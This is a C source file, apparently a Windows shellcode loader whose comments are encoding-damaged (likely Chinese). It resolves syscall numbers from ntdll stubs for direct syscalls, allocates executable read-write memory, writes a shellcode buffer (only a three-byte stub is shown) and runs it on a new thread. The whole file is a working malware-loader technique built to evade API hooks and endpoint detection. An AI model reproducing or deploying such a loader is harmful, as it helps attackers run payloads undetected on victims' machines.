#include <Windows.h>
#include<stdio.h>
#include "syscalls.h"

// ȫ�ֱ����������������ļ�����
__declspec(dllexport) FuncationName direct_syscall = { 0 };

INT main() {
    PVOID allocBuffer = NULL;
    SIZE_T buffSize = 0x1000;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    // ��ʼ�� NtAllocateVirtualMemory
    direct_syscall.NtAllocateVirtualMemory.sysAddress = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    direct_syscall.NtAllocateVirtualMemory.wNtFunctionSSN = ((unsigned char*)(direct_syscall.NtAllocateVirtualMemory.sysAddress + 4))[0];

    // ��ʼ������ϵͳ����
    direct_syscall.NtWriteVirtualMemory.sysAddress = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    direct_syscall.NtWriteVirtualMemory.wNtFunctionSSN = ((unsigned char*)(direct_syscall.NtWriteVirtualMemory.sysAddress + 4))[0];

    direct_syscall.NtCreateThreadEx.sysAddress = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
    direct_syscall.NtCreateThreadEx.wNtFunctionSSN = ((unsigned char*)(direct_syscall.NtCreateThreadEx.sysAddress + 4))[0];

    direct_syscall.NtWaitForSingleObject.sysAddress = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    direct_syscall.NtWaitForSingleObject.wNtFunctionSSN = ((unsigned char*)(direct_syscall.NtWaitForSingleObject.sysAddress + 4))[0];

    // ���� NtAllocateVirtualMemory �����ڴ�
    NTSTATUS status = NtAllocateVirtualMemory(
        (HANDLE)-1,            // ��ǰ���̾��
        &allocBuffer,          // �����ڴ����ʼ��ַ
        0,                     // ZeroBits
        &buffSize,             // �����ڴ�Ĵ�С
        MEM_COMMIT | MEM_RESERVE, // �ڴ��������
        PAGE_EXECUTE_READWRITE // �ڴ汣��
    );

    if (status != 0) {
        printf("NtAllocateVirtualMemory failed: 0x%x\n", status);
        return -1;
    }

    // д�� Shellcode
    unsigned char shellcode[] = "\xfc\x48\x83";
    ULONG bytesWritten;

    status = NtWriteVirtualMemory(
        GetCurrentProcess(), // ��ǰ����
        allocBuffer,         // д���Ŀ���ַ
        shellcode,           // д�������
        sizeof(shellcode),   // ���ݴ�С
        &bytesWritten        // ʵ��д��Ĵ�С
    );

    if (status != 0) {
        printf("NtWriteVirtualMemory failed: 0x%x\n", status);
        return -1;
    }

    // �����߳���ִ�� Shellcode
    HANDLE hThread;

    status = NtCreateThreadEx(
        &hThread,                   // �߳̾��
        GENERIC_EXECUTE,            // Ȩ��
        NULL,                       // ��������
        GetCurrentProcess(),        // ��ǰ����
        (LPTHREAD_START_ROUTINE)allocBuffer, // �߳���ڵ�
        NULL,                       // ����
        FALSE,                      // ��־
        0,                          // ջ��λ
        0,                          // ջ�ύ��С
        0,                          // ջ������С
        NULL                        // �ֽڻ�����
    );

    if (status != 0) {
        printf("NtCreateThreadEx failed: 0x%x\n", status);
        return -1;
    }

    // �ȴ��߳����
    status = NtWaitForSingleObject(hThread, FALSE, NULL);

    if (status != 0) {
        printf("NtWaitForSingleObject failed: 0x%x\n", status);
        return -1;
    }

    return 0;
}
